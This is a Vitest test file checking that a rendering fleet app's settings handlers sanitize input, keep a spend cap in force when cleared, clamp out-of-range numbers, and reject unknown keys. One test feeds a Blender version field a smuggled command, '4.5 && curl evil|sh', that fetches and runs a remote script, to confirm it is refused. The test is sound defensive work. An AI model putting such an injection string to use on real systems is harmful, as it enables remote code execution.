import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { setup, type World } from '../test/harness'

// Plan 1.14 through the handlers the renderer calls: settings:set used to
// merge whatever arrived straight into settings.json, one keystroke at a
// time (#8 #99 #112 #159). Backspacing the spend cap to retype it saved
// null, which every reader took as "no cap"; the scheduler then rented
// without a limit until the user finished typing, or forever if they
// tabbed away.

let w: World
beforeEach(async () => {
  w = await setup({ settings: { spendCapPerHour: 2, maxActiveNodes: 2 } })
  await w.boot({ start: false })
})
afterEach(() => w.dispose())

describe('settings:set goes through the sanitizer (plan 1.14)', () => {
  it('a spend cap cleared to retype it is not saved: the cap stays in force', async () => {
    const s = await w.invoke('settings:set', { spendCapPerHour: null })
    expect(s.spendCapPerHour).toBe(2)
    expect(w.settings.spendCapPerHour).toBe(2)
  })

  it('settings:update names the refused field and why', async () => {
    const r = await w.invoke('settings:update', { spendCapPerHour: null })
    expect(r.settings.spendCapPerHour).toBe(2)
    expect(r.errors).toEqual([
      {
        field: 'spendCapPerHour',
        message: expect.stringMatching(/spend cap is blank.*no spend cap/),
        outcome: 'rejected'
      }
    ])
  })

  it('"no spend cap" is an explicit choice, saved with its flag', async () => {
    const r = await w.invoke('settings:update', { noSpendCap: true })
    expect(r.errors).toEqual([])
    expect(w.settings).toMatchObject({ spendCapPerHour: null, noSpendCap: true })
  })

  it('a Blender version that would reach the node shell as a second command is refused', async () => {
    const s = await w.invoke('settings:set', { blenderVersionOverride: '4.5 && curl evil|sh' })
    expect(s.blenderVersionOverride).toBe(w.settings.blenderVersionOverride)
    expect(w.settings.blenderVersionOverride).not.toContain('curl')
  })

  it('out-of-range numbers are saved at their limit and say so; an unknown key plants nothing', async () => {
    const r = await w.invoke('settings:update', {
      maxActiveNodes: 1e3,
      idleTimeoutMinutes: 0,
      bogus: true
    } as never)
    expect(w.settings).toMatchObject({ maxActiveNodes: 64, idleTimeoutMinutes: 1 })
    expect(w.settings).not.toHaveProperty('bogus')
    expect(r.errors.map((e) => [e.field, e.outcome])).toEqual([
      ['maxActiveNodes', 'clamped'],
      ['idleTimeoutMinutes', 'clamped'],
      ['bogus', 'rejected']
    ])
  })

  it('offer filters merge one by one, each through its rule', async () => {
    const r = await w.invoke('settings:update', {
      offerFilters: { minDiskGb: 80, minReliability: 7 }
    })
    expect(w.settings.offerFilters).toMatchObject({ minDiskGb: 80, minReliability: 1 })
    expect(w.settings.offerFilters.minGpuRamGb).toBe(10)
    expect(r.errors).toEqual([expect.objectContaining({ field: 'offerFilters.minReliability' })])
  })

  it('fleet:setMaxNodes: through the same gate; a value no reader expects is refused aloud', async () => {
    await w.invoke('fleet:setMaxNodes', 3)
    expect(w.settings.maxActiveNodes).toBe(3)
    await expect(w.invoke('fleet:setMaxNodes', Number.NaN)).rejects.toThrow(/max active nodes/)
    await expect(w.invoke('fleet:setMaxNodes', 2.5)).rejects.toThrow(/whole number/)
    expect(w.settings.maxActiveNodes).toBe(3)
  })
})
